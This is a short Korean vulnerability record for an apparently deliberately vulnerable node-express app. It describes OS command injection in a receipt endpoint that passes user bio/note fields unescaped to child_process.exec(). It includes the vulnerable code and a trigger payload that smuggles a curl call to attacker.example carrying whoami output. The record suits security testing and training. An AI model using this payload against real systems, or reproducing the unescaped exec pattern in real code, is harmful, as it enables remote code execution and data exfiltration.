# VULN-010 OS command injection in receipt generation

- 대상 스택: node-express
- 심각도: Critical
- 분류: A03:2021 Injection (OS Command Injection)

## 위치

`apps/node-express/src/routes/orders.js`, `POST /api/orders/:id/receipt` — 사용자가 `PUT /api/profile`로 자유롭게 설정 가능한 `bio` 필드(또는 요청 바디의 `note`)를 검증/이스케이프 없이 셸 명령 문자열에 직접 삽입해 `child_process.exec()`로 실행.

```js
const cmd = `echo "영수증 - 주문번호: ${order.toss_order_id} / 수령인: ${user.name} / 메모: ${note}" > "${filePath}"`;
exec(cmd, ...);
```

## 트리거 방법

```
PUT /api/profile
{"bio": "\"; curl http://attacker.example/$(whoami) #"}

POST /api/orders/1/receipt
```

`note`/`bio`에 백틱, `;`, `$()`, `|` 등을 포함시켜 임의 명령 실행. 컨테이너 내 임의 코드 실행(RCE)으로 이어짐.

## 조치 상태: 미조치 (의도된 취약점)
